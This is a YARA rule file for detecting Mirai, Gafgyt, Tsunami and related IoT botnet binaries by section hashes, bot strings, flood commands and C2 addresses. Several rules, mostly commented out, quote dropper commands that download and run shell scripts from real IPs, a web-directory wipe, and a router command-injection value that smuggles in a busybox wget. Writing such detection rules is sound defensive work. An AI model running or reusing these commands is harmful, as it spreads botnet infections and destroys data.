import "elf"
import "hash"
include "rules/magics.yar"


/*
  Mirai rules based on section hashes. This is a new version that
  1. Calculate hashes based on start string of section, and section's size
  2. No loop to improve speed
  3. Hashes removed some Nullbytes (prefix and suffix)
  Problem:
  1. Some samples has no sections in memory. The other rule handled it
  2. I haven't found any sample that changes its section data (changes instead of remove sections)
    it's possibly some samples can bypass this
*/
rule Mirai_Gen1 {
  strings:
    $s1 = ".symtab" fullword
    $s2 = ".shstrtab" fullword
    $s3 = ".note.gnu.property" fullword
  condition:
    elf_magic and
    (
      hash.md5(@s1[1], 0x64) == "cfea6ff0b826a05a3c24bd9b4da705c7" or
      hash.md5(@s2[1], 0x3C) == "6de76eb8aa868bf6751c01b7d120e909" or
      hash.md5(@s3[1], 0x74) == "5321a249df6dd47fabd3ca3dcc1ed7c9"
    )
}


// Use some common strings
rule Mirai_Gen2 {
  // meta:
  //   description = "Detect some Mirai's variants including Gafgyt and Tsunami variants (named by ClamAV) using section hash. File only"
  // file fa9878*95ec37, compiled Py
  strings:
    $ = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /" fullword ascii
    $ = "makeIPPacket" fullword ascii
    $ = "UDPRAW" fullword ascii
    $ = "sendRAW" fullword ascii
    $ = "HshrQjzbSjHs" fullword ascii
  condition:
    elf_magic and any of them
}


rule IRCBot_Generic
{
  // meta:
  //   description = "Common strings used in Mirai"
  strings:
    $ = "WHO %s" fullword ascii
    $ = "PONG %s" fullword ascii
    $ = "NICK %s" fullword ascii
    $ = "JOIN %s" fullword ascii
  condition:
    elf_exec and 2 of them
}


rule Tsunami_de1b {
  // meta:
  //   md5 = "de1bbb1e4a94de0d047673adaed080c1"
  //   description = "Tsunami variant"
  strings:
    $ = "Tsunami successfully deployed!" ascii
    $ = ".tsunami -l .t -g" fullword ascii
  condition:
    elf_magic and any of them
}

rule Mirai_4c36 {
  // meta:
  //   md5 = "4c366b0552eac10a254ed2d177ba233d"
  strings:
    $ = "%9s %3hu %255[^\n]" fullword ascii
    $ = "oanacroane" fullword ascii
  condition:
    elf_magic and any of them
}


rule Mirai_9c77 {
  // meta:
  //   md5 = "9c77a9f860f2643dc0cdbcd6bda65140"
  strings:
    $ = "31mip:%s" ascii
  condition:
    elf_magic and any of them
}


rule Mirai_92a0 {
  // meta:
  //   md5 = "92a049c55539666bebc68c1a5d9d86ef"
  strings:
    $ = "4r3s b0tn3t" fullword ascii
  condition:
    elf_magic and any of them
}

rule VTFlooder_1d47 {
  // meta:
  //   md5 = "1d4789f3de97c80a4755d7ef2cd844b3"
  strings:
    $ = "iceis" fullword ascii
    $ = "Setting up sockets" fullword ascii
    $ = "Starting flood" fullword ascii
  condition:
    elf_dyn and 2 of them
}

rule Flooder_Generic {
  // TODO better string detection for similar text
  strings:
    $ = "Flooding %s" fullword ascii
    $ = "LOLNOGTFO" fullword ascii
    $ = "KILLATTK" fullword ascii
    $ = "[UDP] Failed to ddos" fullword ascii
    $ = "] flood" ascii nocase
    $ = "[http flood]" fullword ascii
    $ = "Opening sockets" fullword ascii
    $ = "Sending attack" fullword ascii
    $ = "Flooding with" fullword ascii
    $ = "HACKPGK" fullword ascii
    $ = "RANDOMFLOOD" fullword ascii
    $ = "ACKFLOOD" fullword ascii
    $ = "udp flooder" ascii
    $ = "SYNFLOOD" ascii
    $ = "SYN_Flood" ascii
    $ = "udp_flood" ascii
    $ = "udpflood" ascii
    $ = "HTTPFLOOD" ascii
    $ = "RANDOMFLOOD" ascii
  condition:
    elf_magic and 2 of them
}


rule RacismNet_41fa {
  // meta:
  //   url = "https://bazaar.abuse.ch/download/d49a93c84e608ea820329306c6fc9dd5e6e027fb2ea996f2a79d12f4626068a5/"
  strings:
    $ = "RacismNet9" fullword ascii
    $ = "BOTKILL" fullword ascii
  condition:
    elf_magic and all of them
}

rule Zyxel_Generic {
  strings:
    $ = "killer_kill_by_port" fullword ascii
  condition:
    elf_magic and all of them
}

rule HuaweiExploit_201717215 {
  // meta:
  //   url = "https://securitynews.sonicwall.com/xmlpost/new-wave-of-attacks-attempting-to-exploit-huawei-home-routers/"
  strings:
    $ = "3612f843a42db38f48f59d2a3597e19c" fullword ascii
    $ = "huawei_scanner.c" fullword ascii
  condition:
    elf_magic and all of them
}


rule Helios_Generic {
  strings:
    $ = "Botnet Made By greek.Helios" fullword ascii nocase
  condition:
    elf_magic and all of them
}


// rule Okami_Dwnlder {
//   strings:
//     $ = "rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*"
//     $ = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://"
//   condition:
//     all of them
// }

// rule Mirai_Gen2 {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Unique strings of Mirai samples for memory scan"
//   strings:
//     $1 = "4r3s b0tn3t" // 0e492a3be57312e9b53ea378fa09650191ddb4aee0eed96dfc71567863b500a8
//     // strings from 206ad8fec64661c1fed8f20f71523466d0ca4ed9c01d20bea128bfe317f4395a
//     // and 341a49940749d5f07d32d1c8dfddf6388a11e45244cc54bc8768a8cd7f00b46a
//     $2 = "User-Agent: Hello, Momentum"
//     $3 = "GET /shell?cd+/tmp;+wget+http:/\\/"
//     // Found in 5a888ae2128e398b401d8ab8333f0fe125134892b667e1acd3dd3fee98f6ea3f
//     $4 = "w5q6he3dbrsgmclkiu4to18npavj702f" fullword ascii
//     $5 = "EcstasyCode#0420 | Famy#2900" // d8878a0593c1920571afaa2c024d8d4589f13b334c064200b35af0cff20de3e5
//   condition:
//     any of them
// }


// rule Mirai_TypeC {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "15/11/2021"
//     target = "File, Memory"
//     status = "Tested, confirmed with processes"
//     description = "Strings from dumped mem"
//     hash = "a9878bffe5e771bd09109df185dc41883ca0a560bb7b635abddc4259995ec37"
//   strings:
//     $cc = "194.76.226.240"
//     $s1 = "Device Connected: %s | Port: %s | Arch: %s"
//     $s2 = "TSource Engine Query"
//     $s3 = "L33T HaxErS"
//   condition:
//     $cc or ($s2 and ($s1 or $s3))
// }


// rule Mirai_DemonBot_A
// {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Mirai's variant DemonBot"
//     reference = "https://otx.alienvault.com/malware/Backdoor:Linux%2FDemonBot/fileSamples"
//     date = "12/11/2021"
//     target = "File, memory"
//   strings:
//     $cc = "54.38.218.178"
//     $file_str = "/proc/net/route"
//     $str_1 = "PozHlpiND4xPDPuGE6tq"
//     $str_2 = "tg57YSAcuvy2hdBlEWMv"
//     $str_3 = "VaDp3Vu5m5bKcfCU96RX"
//     $str_4 = "UBWcPjIZOdZ9IAOSZAy6"
//     $str_5 = "JezacHw4VfzRWzsglZlF"
//     $str_6 = "3zOWSvAY2dn9rKZZOfkJ"
//     $str_7 = "oqogARpMjAvdjr9Qsrqj"
//     $str_8 = "yQAkUvZFjxExI3WbDp2g"
//     $str_9 = "35arWHE38SmV9qbaEDzZ"
//     $str_10 = "kKbPlhAwlxxnyfM3LaL0"
//     $str_11 = "a7pInUoLgx1CPFlGB5JF"
//     $str_12 = "yFnlmG7bqbW682p7Bzey"
//     $str_13 = "S1mQMZYF6uLzzkiULnGF"
//     $str_14 = "jKdmCH3hamvbN7ZvzkNA"
//     $str_15 = "bOAFqQfhvMFEf9jEZ89M"
//     $str_16 = "VckeqgSPaAA5jHdoFpCC"
//     $str_17 = "CwT01MAGqrgYRStHcV0X"
//     $str_18 = "72qeggInemBIQ5uJc1jQ"
//     $str_19 = "zwcfbtGDTDBWImROXhdn"
//   condition:
//     $file_str and ($cc or 3 of ($str*))
// }


// rule Shellshock_Generic_A {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Shellshock.A"
//     reference = "https://otx.alienvault.com/indicator/file/88ab21215c71fe88b04ab7b0e6a882a65c25df5aed79232f495f4bdb4c9a3600"
//     date = "12/11/2021"
//     target = "File, memory"
//   strings:
//     $addr_1 = "http://195.58.39.37/bins.sh"
//     $addr_2 = "185.172.110.209"
//     // $str_1 = "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'"
//     // $str_2 = "cd /tmp; wget http://195.58.39.37/bins.sh || curl -O http://195.58.39.37/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 195.58.39.37 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 195.58.39.37; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh"
//     $cmd_3 = "chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh"
//   condition:
//     any of them
// }


// rule BotenaGo_Generic_A {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "29/11/2021"
//     reference = "https://otx.alienvault.com/indicator/file/2993eaf466f70bf89fec5fa950bf83c09f8b64343d6a121fa1d8988af4ea6ca2"
//     reference = "https://otx.alienvault.com/indicator/file/0c395715bfeb8f89959be721cd2f614d2edb260614d5a21e90cc4c142f5d83ad"
//     reference = "https://cybersecurity.att.com/blogs/labs-research/att-alien-labs-finds-new-golang-malwarebotenago-targeting-millions-of-routers-and-iot-devices-with-more-than-30-exploits"
//   strings:
//     $addr_1 = "107.172.30.215"
//     $addr_2 = "159.65.232.56"
//     $addr_3 = "http://adminisp:adminispbad" nocase
//     $cc_1 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://"
//     $cmd_1 = "/bin/busybox chmod 777 * /tmp/xvg; /tmp/xvg selfrep.huawei"
//   condition:
//     any of them
// }
